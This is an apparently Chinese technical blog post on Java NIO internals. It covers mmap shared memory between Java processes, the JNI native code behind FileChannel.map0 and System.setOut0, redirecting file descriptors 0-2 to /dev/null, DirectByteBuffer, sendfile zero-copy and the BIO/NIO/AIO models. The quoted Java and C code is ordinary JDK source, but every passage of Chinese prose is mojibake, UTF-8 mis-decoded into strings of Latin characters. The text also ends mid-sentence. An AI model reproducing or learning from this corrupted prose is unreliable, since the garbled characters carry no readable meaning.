å®é™…ä¸Š,mmapç³»ç»Ÿè°ƒç”¨å¹¶ä¸æ˜¯å®Œå…¨ä¸ºäº†ç”¨äºå…±äº«å†…å­˜è€Œè®¾è®¡çš„.å®ƒæœ¬èº«æä¾›äº†ä¸åŒäºä¸€èˆ¬å¯¹æ™®é€šæ–‡ä»¶çš„è®¿é—®æ–¹å¼,æ˜¯è¿›ç¨‹å¯ä»¥åƒè¯»å†™å†…å­˜ä¸€æ ·å¯¹æ™®é€šæ–‡ä»¶æ“ä½œ.è€ŒPosixæˆ–System Vçš„å…±äº«å†…å­˜åˆ™æ˜¯çº¯ç²¹ç”¨äºå…±äº«å†…å­˜çš„,å½“ç„¶mmapå®ç°å…±äº«å†…å­˜ä¹Ÿæ˜¯ä¸»è¦åº”ç”¨ä¹‹ä¸€.mmapå‡½æ•°æ˜¯unix/linuxä¸‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œmmapç³»ç»Ÿè°ƒç”¨å¹¶ä¸æ˜¯å®Œå…¨ä¸ºäº†ç”¨äºå…±äº«å†…å­˜è€Œè®¾è®¡çš„,mmapå®ç°å…±äº«å†…å­˜ä¹Ÿæ˜¯å…¶ä¸»è¦ä½œç”¨ä¹‹ä¸€ï¼Œäº‹å®ä¸Šå¯ä»¥å®ç°ä¸¤ä¸ªjavaè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ Aè¿›ç¨‹ public class Main { public static void main(String args[]){ RandomAccessFile f = null; try { f = new RandomAccessFile(&quot;C:/hinusDocs/hello.txt&quot;, &quot;rw&quot;); FileChannel fc = f.getChannel(); MappedByteBuffer buf = fc.map(FileChannel.MapMode.READ_WRITE, 0, 20); buf.put(&quot;how are you?&quot;.getBytes()); Thread.sleep(10000); fc.close(); f.close(); } catch (Exception e) { e.printStackTrace(); } } } Bè¿›ç¨‹ public class MapMemoryBuffer { public static void main(String[] args) throws Exception { RandomAccessFile f = new RandomAccessFile(&quot;C:/hinusDocs/hello.txt&quot;, &quot;rw&quot;); FileChannel fc = f.getChannel(); MappedByteBuffer buf = fc.map(FileChannel.MapMode.READ_WRITE, 0, fc.size()); while (buf.hasRemaining()) { System.out.print((char)buf.get()); } System.out.println(); } } å¾ˆå¤šjavaæ–¹æ³•æœ¬è´¨ä¸Šå°±æ˜¯jniè¿›è¡Œäº†ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨sun.nio.ch.FileChannelImplé‡Œæœ‰mapçš„å…·ä½“å®ç°ï¼š try { // If no exception was thrown from map0, the address is valid addr = map0(imode, mapPosition, mapSize); } catch (OutOfMemoryError x) { private native long map0(int prot, long position, long length) æ¯”å¦‚Javaçš„è¿™ä¸ªmap0å‡½æ•°ï¼Œå…·ä½“çš„å®ç°åœ¨solaris/native/sun/nio/ch/FileChannelImpl.cè¿™ä¸ªæ–‡ä»¶é‡Œ JNIEXPORT jlong JNICALL Java_sun_nio_ch_FileChannelImpl_map0(JNIEnv *env, jobject this, jint prot, jlong off, jlong len) { void *mapAddress = 0; jobject fdo = (*env)-&gt;GetObjectField(env, this, chan_fd); jint fd = fdval(env, fdo); int protections = 0; int flags = 0; if (prot == sun_nio_ch_FileChannelImpl_MAP_RO) { protections = PROT_READ; flags = MAP_SHARED; } else if (prot == sun_nio_ch_FileChannelImpl_MAP_RW) { protections = PROT_WRITE | PROT_READ; flags = MAP_SHARED; } else if (prot == sun_nio_ch_FileChannelImpl_MAP_PV) { protections = PROT_WRITE | PROT_READ; flags = MAP_PRIVATE; } mapAddress = mmap64( 0, /* Let OS decide location */ len, /* Number of bytes to map */ protections, /* File permissions */ flags, /* Changes are shared */ fd, /* File descriptor of mapped file */ off); /* Offset into file */ if (mapAddress == MAP_FAILED) { if (errno == ENOMEM) { JNU_ThrowOutOfMemoryError(env, &quot;Map failed&quot;); return IOS_THROWN; } return handle(env, -1, &quot;Map failed&quot;); } return ((jlong) (unsigned long) mapAddress); } å…¶å®å°±æ˜¯é€šè¿‡jniè°ƒç”¨äº†cè¯­è¨€api. jniå¯ä»¥åšä¸€äº›å¾ˆæœ‰æ„æ€çš„äº‹æƒ…æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºæ˜¯æ‰€æœ‰æ“ä½œç³»ç»Ÿéƒ½æ”¯æŒçš„ï¼Œå¯¹äºä¸€ä¸ªè¿›ç¨‹æ¥è¯´ï¼Œæ–‡ä»¶æè¿°ç¬¦0,1,2å›ºå®šæ˜¯æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚ javaè¯­æ³•ä¸­æœ‰ä¸€æ¡æ˜¯finalçš„æˆå‘˜å˜é‡è¦ä¹ˆåœ¨å£°æ˜çš„æ—¶å€™å°±åˆå§‹åŒ–ï¼Œè¦ä¹ˆåœ¨æ„é€ å‡½æ•°ä¸­å°±å¾—åˆå§‹åŒ–ã€‚åœ¨Systemè¿™ä¸ªclassä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä½¿ç”¨jniå¼ºè¡Œä¿®æ”¹finalå˜é‡çš„åšæ³•ï¼ˆç±»ä¼¼çš„æƒ…å†µåœ¨sun.nio.ch.IOUtilä¸­ä¹Ÿæœ‰ï¼Œåœ¨staticä»£ç å—ä¸­åˆå§‹åŒ–ä¸€ä¸ªfinalçš„intå€¼ï¼‰JDK æºç é˜…è¯» : FileDescriptoræ–‡ä¸­æåˆ°: Systemä½œä¸ºä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼Œç±»æ„é€ æ—¶æ— æ³•å®ä¾‹åŒ–in/out/errï¼Œæ„é€ å‘ç”Ÿåœ¨initializeSystemClassè¢«è°ƒç”¨æ—¶ï¼Œä½†æ˜¯in/out/erræ˜¯è¢«å£°æ˜ä¸ºfinalçš„ï¼Œå¦‚æœå£°æ˜æ—¶å’Œç±»æ„é€ æ—¶æ²¡æœ‰èµ‹å€¼ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ï¼Œæ‰€ä»¥Systemåœ¨å®ç°æ—¶ï¼Œå…ˆè®¾ç½®ä¸ºnullï¼Œç„¶åé€šè¿‡nativeæ–¹æ³•æ¥åœ¨è¿è¡Œæ—¶ä¿®æ”¹ï¼ˆå­¦åˆ°äº†ä¸å°‘å¥‡æŠ€æ·«å·§ã€‚ã€‚ï¼‰ï¼Œé€šè¿‡setIn0/setOut0/setErr0çš„æ³¨é‡Šä¹Ÿå¯ä»¥è¯´æ˜è¿™ä¸€ç‚¹ï¼š public final class System { public final static InputStream in = null; public final static PrintStream out = null; public final static PrintStream err = null; /** * Initialize the system class. Called after thread initialization. */ private static void initializeSystemClass() { FileInputStream fdIn = new FileInputStream(FileDescriptor.in); FileOutputStream fdOut = new FileOutputStream(FileDescriptor.out); FileOutputStream fdErr = new FileOutputStream(FileDescriptor.err); setIn0(new BufferedInputStream(fdIn)); setOut0(newPrintStream(fdOut, props.getProperty(&quot;sun.stdout.encoding&quot;))); setErr0(newPrintStream(fdErr, props.getProperty(&quot;sun.stderr.encoding&quot;))); } private static native void setIn0(InputStream in); private static native void setOut0(PrintStream out); private static native void setErr0(PrintStream err); } /* * The following three functions implement setter methods for * java.lang.System.{in, out, err}. They are natively implemented * because they violate the semantics of the language (i.e. set final * variable). */ JNIEXPORT void JNICALL Java_java_lang_System_setIn0(JNIEnv *env, jclass cla, jobject stream) { jfieldID fid = (*env)-&gt;GetStaticFieldID(env,cla,&quot;in&quot;,&quot;Ljava/io/InputStream;&quot;); if (fid == 0) return; (*env)-&gt;SetStaticObjectField(env,cla,fid,stream); } JNIEXPORT void JNICALL Java_java_lang_System_setOut0(JNIEnv *env, jclass cla, jobject stream) { jfieldID fid = (*env)-&gt;GetStaticFieldID(env,cla,&quot;out&quot;,&quot;Ljava/io/PrintStream;&quot;); if (fid == 0) return; (*env)-&gt;SetStaticObjectField(env,cla,fid,stream); } JNIEXPORT void JNICALL Java_java_lang_System_setErr0(JNIEnv *env, jclass cla, jobject stream) { jfieldID fid = (*env)-&gt;GetStaticFieldID(env,cla,&quot;err&quot;,&quot;Ljava/io/PrintStream;&quot;); if (fid == 0) return; (*env)-&gt;SetStaticObjectField(env,cla,fid,stream); } è¿™ç¯‡æ–‡ç« è¿˜æŒ‡å‡ºäº†: å°è¯•å…³é—­0ï¼Œ1ï¼Œ2æ–‡ä»¶æè¿°ç¬¦ï¼Œéœ€è¦ç‰¹æ®Šçš„æ“ä½œã€‚é¦–å…ˆè¿™ä¸‰ä¸ªæ˜¯ä¸èƒ½å…³é—­çš„ï¼Œå¦‚æœå…³é—­äº†ï¼Œåç»­æ‰“å¼€çš„æ–‡ä»¶å°±ä¼šå ç”¨è¿™ä¸‰ä¸ªæè¿°ç¬¦ï¼Œ // /jdk/src/solaris/native/java/io/FileInputStream_md.c JNIEXPORT void JNICALL Java_java_io_FileInputStream_close0(JNIEnv *env, jobject this) { fileClose(env, this, fis_fd); } // /jdk/src/solaris/native/java/io/io_util_md.c void fileClose(JNIEnv *env, jobject this, jfieldID fid) { FD fd = GET_FD(this, fid); if (fd == -1) { return; } /* Set the fd to -1 before closing it so that the timing window * of other threads using the wrong fd (closed but recycled fd, * that gets re-opened with some other filename) is reduced. * Practically the chance of its occurance is low, however, we are * taking extra precaution over here. */ SET_FD(this, -1, fid); // å°è¯•å…³é—­0ï¼Œ1ï¼Œ2æ–‡ä»¶æè¿°ç¬¦ï¼Œéœ€è¦ç‰¹æ®Šçš„æ“ä½œã€‚é¦–å…ˆè¿™ä¸‰ä¸ªæ˜¯ä¸èƒ½å…³é—­çš„ï¼Œ // å¦‚æœå…³é—­çš„ï¼Œåç»­æ‰“å¼€çš„æ–‡ä»¶å°±ä¼šå ç”¨è¿™ä¸‰ä¸ªæè¿°ç¬¦ï¼Œ // æ‰€ä»¥åˆç†çš„åšæ³•æ˜¯æŠŠè¦å…³é—­çš„æè¿°ç¬¦æŒ‡å‘/dev/nullï¼Œå®ç°å…³é—­çš„æ•ˆæœ // ä¸è¿‡Javaä»£ç ä¸­ï¼Œæ­£å¸¸æ˜¯æ²¡åŠæ³•å…³é—­0ï¼Œ1ï¼Œ2æ–‡ä»¶æè¿°ç¬¦çš„ if (fd &gt;= STDIN_FILENO &amp;&amp; fd &lt;= STDERR_FILENO) { int devnull = open(&quot;/dev/null&quot;, O_WRONLY); if (devnull &lt; 0) { SET_FD(this, fd, fid); // restore fd JNU_ThrowIOExceptionWithLastError(env, &quot;open /dev/null failed&quot;); } else { dup2(devnull, fd); close(devnull); } } else if (close(fd) == -1) { // å…³é—­é0ï¼Œ1ï¼Œ2çš„æ–‡ä»¶æè¿°ç¬¦åªæ˜¯è°ƒç”¨closeç³»ç»Ÿè°ƒç”¨ JNU_ThrowIOExceptionWithLastError(env, &quot;close failed&quot;); } } çŸ¥ä¹ä¸Šå…³äºDirectByteBufferçš„è®¨è®º æ•´ä¸ªJVMéƒ½æ˜¯è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´ä¸Šçš„ï¼Œä¸å­˜åœ¨å†…æ ¸ç©ºé—´çš„åˆ†é…ã€‚Java NIO çš„IOè¯»å†™å¦‚æœä¸æ˜¯directbufferå°±æŠŠæ•°æ®copyçš„ä¸´æ—¶çš„directbufferä¸­å†åšIOè¯»å†™ã€‚æ‰€ä»¥ç›´æ¥ä½¿ç”¨directbufferä¼šèŠ‚çœå†…å­˜copyæ¬¡æ•°ï¼Œè¿™æ˜¯JavaNIOæ¡†æ¶å…·ä½“å®ç°æ–¹å¼çš„é™åˆ¶ï¼Œä¸å¥½ç§°ä¹‹ä¸ºâ€œä¼˜åŠ¿â€ã€‚JavaNIOä½¿ç”¨directbufferè¿›è¡ŒIOè¯»å†™çš„åŸå› ä¸»è¦æ˜¯åœ¨GCä¼˜åŒ–ä¸Šã€‚jvmå¹¶ä¸æ˜¯ä¸èƒ½ç›´æ¥ç”¨java heapbufferæˆ–java byte[]ç›´æ¥åšIOè¯»å†™ï¼Œä½†ä¼šmarkæ­¤æ®µå†…å­˜ä¸èƒ½ç§»åŠ¨ï¼Œä»è€Œå½±å“GCæ•ˆç‡ã€‚ä½†æ˜¯JavaNIOæ¡†æ¶é‡Œçš„IOæ“ä½œéƒ½æ˜¯éé˜»å¡æ¨¡å¼çš„å¿«é€Ÿæ“ä½œï¼Œç©¶ç«Ÿèƒ½å½±å“å¤šå°‘GCæ•ˆç‡è¿˜ä¸èƒ½è½»æ˜“ä¸‹ç»“è®ºã€‚JavaNIOçš„é«˜æ•ˆä¸»è¦ä½“ç°åœ¨ç›¸å¯¹java bioåœ¨ç®¡ç†å¤§é‡è¿æ¥æ—¶å°‘ä½¿ç”¨äº†å¾ˆå¤šçº¿ç¨‹è€ŒèŠ‚çœçš„çº¿ç¨‹èµ„æºå’Œçº¿ç¨‹åˆ‡æ¢ï¼Œä½†å…¶ç¼–ç¨‹æ¨¡å‹æ¯”BIOè¦å¤æ‚å¾—å¤šï¼Œåªèƒ½è¯´NIOé«˜æ•ˆï¼Œä¸å¥½è¯´å®ƒâ€œé«˜çº§â€ã€‚å¯¹äºå®¢æˆ·ç«¯ä½¿ç”¨å°‘é‡è¿æ¥æ—¶ï¼ŒBIOæ¯”NIOæ›´æœ‰ä¼˜åŠ¿ï¼Œä¸ä½†ç¼–ç¨‹æ¨¡å‹ç®€å•ï¼ŒIOæ•ˆç‡ä¹Ÿä¸æ¯”NIOå·®ã€‚directbufferæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå†…å­˜éšæ‚£ï¼Œä½¿ç”¨directbufferå¹¶ä¸èƒ½åƒheapbufferæˆ–byte[]ä¸€æ ·ä»»æ„ä½¿ç”¨å¯ä»¥è¢«GCåŠæ—¶çš„å›æ”¶ã€‚æ‰€ä»¥ä½¿ç”¨directbufferæœ€å¥½æ˜¯åˆ†é…å¥½ç¼“å­˜èµ·æ¥é‡å¤ä½¿ç”¨ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å‡ºç°OOMé”™è¯¯ã€‚ DirectByteBufferè¿™ä¸ªå¯¹è±¡å ç”¨çš„å†…å­˜æ˜¯æ”¾åœ¨java heapä¸Šçš„ï¼Œè¿™éƒ¨åˆ†æ²¡å¤šå°‘ï¼Œä½†æ˜¯å…¶åˆ†é…çš„nativeå†…å­˜(ä¹Ÿå°±æ˜¯æ”¾åœ¨Cè¯­è¨€çš„heapä¸Šçš„)æ˜¯å ä¸»è¦å¤§å°çš„ã€‚è¿™éƒ¨åˆ†çš„é‡Šæ”¾ä½¿ç”¨äº†PhantomReferenceè¿½è¸ªDirectByteBufferè¢«åŠ å…¥åˆ°ReferenceQueueçš„æ—¶å€™å°±ä¼šå¼€å§‹è¿è¡Œä¸€ä¸ªrunnbaleï¼Œè¿™é‡Œé¢å»è°ƒç”¨jniæ–¹æ³•é‡Šæ”¾å†…å­˜ã€‚ FileChannelçš„å‡ ä¸ªé‡è¦æ–¹æ³•ç›´æ¥ä¸Šä¸€ä¸ªç”¨FileChannelè¯»å–æ–‡ä»¶çš„ä»£ç  RandomAccessFile aFile = new RandomAccessFile(&quot;/tmp/sample.txt&quot;, &quot;rw&quot;); FileChannel inChannel = aFile.getChannel(); ByteBuffer buf = ByteBuffer.allocate(48); int bytesRead = inChannel.read(buf); while (bytesRead != -1) { System.out.println(&quot;Read &quot; + bytesRead); buf.flip(); while(buf.hasRemaining()){ System.out.print((char) buf.get()); } buf.clear(); bytesRead = inChannel.read(buf); } aFile.close(); 3. ä»opnjdkçš„Cè¯­è¨€å®ç°æ¥çœ‹jvmå¯¹system callçš„é€‰æ‹©Java File I/Oå¤§æ··æˆ˜ è¿™ç¯‡youtubeä¸Šçš„æ¼”è®²ä»jdkå¯¹system callè°ƒç”¨çš„é€‰æ‹©æ¥çœ‹åˆ†æäº†å„è‡ªçš„æ•ˆç‡FileChannel.transferToæ–¹æ³•ä¼šæ ¹æ®host machineçš„æ“ä½œç³»ç»Ÿé€‰æ‹©æ–‡ä»¶æ“ä½œçš„system callæ–¹æ¡ˆ:é€Ÿåº¦å’Œæ•ˆç‡ä¹Ÿæ˜¯ä¾æ¬¡é™ä½ sendFileï¼ˆlinux kernel 2.4+æ”¯æŒï¼Œdata copyä½¿ç”¨ç£ç›˜DMA engineï¼Œä¸æ¶ˆè€—cpuï¼Œå³æ‰€è°“zero copyï¼‰ mmap read(æœ€æ…¢) ä¸Šé¢è¿™æ®µè¯çš„ä»£ç å®ä¾‹åœ¨FileChannelImpl.javaè¿™ä¸ªæ–‡ä»¶ä¸­ public long transferTo(long position, long count, WritableByteChannel target) throws IOException { // Attempt a direct transfer, if the kernel supports it if ((n = transferToDirectly(position, icount, target)) &gt;= 0) return n; // Attempt a mapped transfer, but only to trusted channel types if ((n = transferToTrustedChannel(position, icount, target)) &gt;= 0) return n; // Slow path for untrusted targets return transferToArbitraryChannel(position, icount, target); } åˆ†åˆ«çœ‹windowsä¸‹å’Œlinuxä¸‹çš„transferToçš„cè¯­è¨€å®ç°ï¼Œ çœ‹ä¸€ä¸‹sendfileçš„ä½¿ç”¨ //Windows JNIEXPORT jlong JNICALL Java_sun_nio_ch_FileChannelImpl_transferTo0(JNIEnv *env, jobject this, jint srcFD, jlong position, jlong count, jint dstFD) { return IOS_UNSUPPORTED; //Windowså¹¶ä¸æ”¯æŒ sendfile ä½¿ç”¨ mmap } //solaris.. JNIEXPORT jlong JNICALL Java_sun_nio_ch_FileChannelImpl_transferTo0(JNIEnv *env, jobject this, jint srcFD, jlong position, jlong count, jint dstFD){ #if defined(__linux__) off64_t offset = (off64_t)position; jlong n = sendfile64(dstFD, srcFD, &amp;offset, (size_t)count); // è¿™é‡Œè¿›è¡Œäº†system call //.. #elif defined (__solaris__) result = sendfilev64(dstFD, &amp;sfv, 1, &amp;numBytes); //.. #elif defined(__APPLE__) result = sendfile(srcFD, dstFD, position, &amp;numBytes, NULL, 0); #endif zero copyæŠ€æœ¯ 4. java nioä»‹ç»java nioä»‹ç» æ–‡ç« å†™çš„éå¸¸å¥½java ioçš„å‘å±•ç»å†äº†ä¸‰ä¸ªé˜¶æ®µ io/bio å³java.io.*ï¼Œé¢å‘æµï¼Œé˜»å¡ioï¼Œé€ä¸ªå­—èŠ‚çš„è¯»å†™ï¼Œæ²¡æœ‰ç›¸åº”çš„ç¼“å†²ï¼ˆé™¤äº†bufferdï¼‰ï¼Œæ•ˆç‡è¾ƒä½ nio ï¼Œjava.nio. é¢å‘ç¼“å†²åŒºï¼Œé˜»å¡/éé˜»å¡ï¼ŒåŒ…å«Buffer,Channel,Selector3 .aio/nio.2, java.nio.channels.Asynchronous,å¼‚æ­¥IOã€é˜»å¡IOã€ç”±ThreadPoolçº¿ç¨‹æ± å®ç°ï¼Œæ¯ä¸ªå¼‚æ­¥IO Channeléƒ½å±äºæŸä¸ªAsynchronousChannelGroupï¼Œè€Œæ¯ä¸ªAsynchronousChannelGroupéƒ½ä¸ä¸€ä¸ªThreadPoolç›¸å…³è”ã€‚ BIOã€NIOã€AIO é€‚ç”¨åœºæ™¯åˆ†æï¼š1) BIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®æ¯”è¾ƒå°ä¸”å›ºå®šçš„æ¶æ„ï¼Œè¿™ç§æ–¹å¼å¯¹æœåŠ¡å™¨èµ„æºè¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼ŒJDK1.4 ä»¥å‰çš„å”¯ä¸€é€‰æ‹©ï¼Œä½†ç¨‹åºç›´è§‚ç®€å•æ˜“ç†è§£ã€‚2) NIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒçŸ­ï¼ˆè½»æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚èŠå¤©æœåŠ¡å™¨ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ï¼ŒJDK1.4 å¼€å§‹æ”¯æŒã€‚3) AIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒé•¿ï¼ˆé‡æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚ç›¸å†ŒæœåŠ¡å™¨ï¼Œå……åˆ†è°ƒç”¨ OS å‚ä¸å¹¶å‘æ“ä½œï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ï¼ŒJDK1.7 å¼€å§‹æ”¯æŒã€‚ linuxä¸‹æä¾›äº”ç§io modelï¼ˆè¿™ä¸ªä¸»è¦æ˜¯é’ˆå¯¹socketæ¥è®²çš„ï¼Œæœ¬åœ°Fileè¯»å–éƒ½æ˜¯é˜»å¡çš„ï¼Œä¸è¦æƒ³å¤ªå¤šï¼‰ åŒæ­¥IO(synchronous IO) é˜»å¡IO(bloking IO) éé˜»å¡IO(non-blocking IO) å¤šè·¯å¤ç”¨IO(multiplexing IO) ä¿¡å·é©±åŠ¨å¼IO(signal-driven IO) è¿™ç§ç”¨çš„ä¸å¤šå¼‚æ­¥IO(asynchronous IO)å…·ä½“çš„ä»‹ç»çœ‹è¿™ç¯‡æ–‡ç« :äº”ç§ioæ¨¡å¼çš„ä»‹ç» è¿™é‡Œè¦å£°æ˜ï¼Œioæ“ä½œå¯ä»¥ç®€å•çš„åˆ†ä¸ºä¸‰ç±»ï¼š å†…å­˜ioï¼Œç›´æ¥å¯¹byte[]æ•°ç»„è¿›è¡Œæ“ä½œï¼Œæ•ˆç‡éå¸¸é«˜ï¼Œä¹Ÿä¸å­˜åœ¨ä»€ä¹ˆé˜»å¡çš„é—®é¢˜ æ–‡ä»¶ioï¼ŒFileInputStream,RamdomAccessFileè¿™äº›ä¸œè¥¿ï¼Œè¿™ä¸ªè·Ÿä¸Šé¢5ç§modelæ²¡æœ‰å¤ªå¤§å…³ç³»ï¼Œå¹¶ä¸”åªèƒ½è¿è¡Œåœ¨é˜»å¡æ¨¡å¼ã€‚javaçš„FileChannelåªèƒ½æ˜¯é˜»å¡å¼çš„ã€‚ socket io ,æ¯”å¦‚è¯´ServerSocketï¼ŒDatagramSocketè¿™ç§ï¼Œè¿™ä¹Ÿæ˜¯Java NIO çš„ä¸»è¦ç ”ç©¶å¯¹è±¡ï¼Œæœ‰é˜»å¡æ¨¡å¼ã€éé˜»å¡æ¨¡å¼ï¼Œé»˜è®¤ä¸ºé˜»å¡æ¨¡å¼ã€‚ å¯¹äºSocketçš„è¯»(recv)å’Œå†™(send)æ“ä½œæ¥è¯´,ä¸»è¦æœ‰ä¸¤ä¸ªé˜¶æ®µï¼Œä»¥recv()ä¸ºä¾‹ï¼š(1) ç­‰å¾…æ•°æ®å‡†å¤‡ï¼Œé€šå¸¸æ¶‰åŠç­‰å¾…ç½‘ç»œä¸Šçš„æ•°æ®åˆ†ç»„åˆ°è¾¾ï¼Œç„¶åè¢«å¤åˆ¶åˆ°å†…æ ¸çš„æŸä¸ªç¼“å†²åŒº(tcp bufferä¹‹ç±»çš„)(2) å°†æ•°æ®ä»å†…æ ¸ç©ºé—´æ¥æ‹·è´åˆ°è¿›ç¨‹ç©ºé—´ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹çš„ç¼“å†²åŒºï¼ˆè°ƒç”¨è€…æä¾›çš„å­—èŠ‚æ•°ç»„ï¼‰åˆ†åˆ«å¯¹ä¸Šé¢å››ç§ï¼ˆä¿¡å·é©±åŠ¨å¼IOç”¨çš„ä¸å¤šï¼Œä¸ä»‹ç»äº†ï¼‰ å¯¹äºåŒæ­¥é˜»å¡IOæ¥è¯´ï¼Œè¿™ä¸¤ä¸ªé˜¶æ®µéƒ½æ˜¯é˜»å¡çš„ å¯¹äºåŒæ­¥éé˜»å¡IOæ¥è¯´ï¼Œå½“socketæ¥æ”¶ç¼“å†²åŒºæ²¡æœ‰æ•°æ®æ—¶ï¼Œrecvä¼šç«‹åˆ»è¿”å›ä¸€ä¸ªç‰¹å®šçš„çŠ¶æ€å€¼ï¼Œè¡¨ç¤ºç°åœ¨æ²¡æœ‰æ•°æ®ï¼Œå¾…ä¼šå†æ¥å§ã€‚å½“socketæ¥æ”¶ç¼“å†²åŒºæœ‰æ•°æ®çš„æ—¶å€™ï¼Œrecvå°†æ•°æ®æ‹·è´åˆ°è¿›ç¨‹ç©ºé—´çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œä¹Ÿæ˜¯é˜»å¡çš„ã€‚é€šå¸¸é‡‡ç”¨è½®è®­pollingçš„æ–¹å¼ï¼Œå¾ªç¯å¾€å¤çš„ä¸»åŠ¨è¯¢é—®å†…æ ¸æœ‰æ²¡æœ‰æ•°æ®å¯ä»¥è¯»å–ã€‚å®é™…ä¸Šï¼Œè¿™æ ·çš„è½®è¯¢å…¶å®è¿˜ä¸é˜»å¡IOçš„æ€§èƒ½å¥½ã€‚åªæœ‰ç¬¬ä¸€æ­¥æ˜¯éé˜»å¡çš„ï¼Œç¬¬äºŒæ­¥è¿˜æ˜¯é˜»å¡çš„ å¯¹äºå¤šè·¯å¤ç”¨IOæ¥è¯´ï¼Œå®ƒçš„ä¼˜åŠ¿æ˜¯å¯ä»¥è°ƒç”¨selectã€pollã€epollè¿™äº›æ“ä½œç³»ç»Ÿçº§åˆ«çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ—¶è½®è®­å¤šä¸ªsocketè¿æ¥ã€‚å½“è°ƒç”¨selectã€pollã€epollçš„æ—¶å€™ï¼Œå¦‚æœæ‰€ç›‘æ§çš„socketä¸­æœ‰éƒ¨åˆ†socketå¯è¯»ï¼Œå¯å†™æˆ–è€…è¿æ¥ä¸Šçš„æ—¶å€™ï¼Œå°±ä¼šè¿”å›ï¼Œå°†å…¶è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹æ¥å¤„ç†ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é˜»å¡çš„ã€‚åªä¸è¿‡æ˜¯å› ä¸ºselectã€pollã€epollç³»ç»Ÿè°ƒç”¨è€Œé˜»å¡çš„ï¼›å½“ç³»ç»Ÿè°ƒç”¨è¿”å›åï¼Œç”¨æˆ·è¿›ç¨‹å†è°ƒç”¨recvï¼Œå°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°è¿›ç¨‹ç©ºé—´ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¹Ÿæ˜¯é˜»å¡çš„ã€‚äº‹å®ä¸Šè¿™ä¸ªæ–¹å¼æ¯”ç¬¬äºŒç§è¿˜å·®äº›ï¼Œå› ä¸ºè¿™é‡ŒåŒ…å«äº†ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨(select/poll/epollã€recv)ï¼Œè€Œç¬¬äºŒç§åªæœ‰ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨recvã€‚ä½†æ˜¯è¿™ç§æ–¹å¼çš„ä¼˜åŠ¿æ˜¯å¯ä»¥å¤„ç†æ›´å¤šçš„è¿æ¥ã€‚è¿æ¥æ•°å¤§çš„æ—¶å€™ï¼Œç¼ºç‚¹å°±è¢«ä¼˜ç‚¹ç»™æ©ç›–äº†ã€‚IOå¤šè·¯å¤ç”¨ç›¸æ¯”å¤šè¿›ç¨‹/å¤šçº¿ç¨‹+ é˜»å¡IOçš„ç³»ç»Ÿå¼€é”€å°ï¼Œå› ä¸ºç³»ç»Ÿä¸éœ€è¦åˆ›å»ºæ–°çš„è¿›ç¨‹æˆ–è€…çº¿ç¨‹ï¼Œä¹Ÿä¸éœ€è¦ç»´æŠ¤å¤šä¸ªè¿›ç¨‹ï¼Œçº¿ç¨‹çš„æ‰§è¡Œã€‚å¯¹äºå¤šè·¯å¤ç”¨IOæ¥è¯´ï¼Œç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯å› ä¸ºselectã€pollã€epollè€Œé˜»å¡çš„ï¼Œç¬¬äºŒä¸ªé˜¶æ®µ(recv)ä¾æ—§æ˜¯é˜»å¡çš„ã€‚ å¯¹äºå¼‚æ­¥IOæ¥è¯´ï¼Œä¸¤ä¸ªé˜¶æ®µéƒ½æ²¡æœ‰è¢«é˜»å¡ï¼Œå› ä¸ºåªéœ€è¦å‘èµ·recã€sendè¯·æ±‚ï¼Œç³»ç»Ÿä¼šå¸®å¿™å®Œæˆæ•°æ®çš„copyï¼Œå®Œäº‹ä¹‹åé€šçŸ¥ç”¨æˆ·è¿›ç¨‹ä¸€å£°ã€‚ å¼‚æ­¥æ“ä½œ(asynchronous IO)çš„æœ¬è´¨æ‰€æœ‰çš„ç¨‹åºæœ€ç»ˆéƒ½ä¼šç”±è®¡ç®—æœºç¡¬ä»¶æ¥æ‰§è¡Œï¼Œæ‰€ä»¥ä¸ºäº†æ›´å¥½çš„ç†è§£å¼‚æ­¥æ“ä½œçš„æœ¬è´¨ï¼Œæˆ‘ä»¬æœ‰å¿…è¦äº†è§£ä¸€ä¸‹å®ƒçš„ç¡¬ä»¶åŸºç¡€ã€‚ç†Ÿæ‚‰ç”µè„‘ç¡¬ä»¶çš„æœ‹å‹è‚¯å®šå¯¹ DMA è¿™ä¸ªè¯ä¸é™Œç”Ÿï¼Œç¡¬ç›˜ã€å…‰é©±çš„æŠ€æœ¯è§„æ ¼ä¸­éƒ½æœ‰æ˜ç¡® DMA çš„æ¨¡å¼æŒ‡æ 